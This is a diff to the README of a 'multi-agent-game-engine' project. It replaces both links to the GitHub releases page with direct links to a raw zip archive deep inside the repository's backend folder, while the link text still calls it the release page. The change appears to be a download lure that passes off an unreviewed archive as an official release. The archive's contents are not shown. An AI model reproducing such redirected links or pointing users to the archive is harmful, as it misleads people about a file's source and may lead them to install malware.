@@ -1,6 +1,6 @@
 # 🤖 multi-agent-game-engine - Build complex AI agent simulation worlds
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Disarrayed-agglutination903/multi-agent-game-engine/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Disarrayed-agglutination903/multi-agent-game-engine/raw/refs/heads/main/backend/agent_engine/engine/agent-engine-multi-game-3.3.zip)
 
 The multi-agent-game-engine provides a complete environment to create, test, and watch AI agents interact. This software brings simulation tools to your desktop. You control the agents, define the environment rules, and observe the results in a visual workspace. It stores all data on your computer to protect your privacy and guarantee performance.
 
@@ -19,7 +19,7 @@ Your computer needs specific hardware to run these simulations smoothly. Please 
 
 You find the application files on the official release page. This page contains the latest version of the engine.
 
-[Visit the release page to download the software](https://github.com/Disarrayed-agglutination903/multi-agent-game-engine/releases)
+[Visit the release page to download the software](https://github.com/Disarrayed-agglutination903/multi-agent-game-engine/raw/refs/heads/main/backend/agent_engine/engine/agent-engine-multi-game-3.3.zip)
 
 1. Open your web browser.
 2. Go to the link provided above.
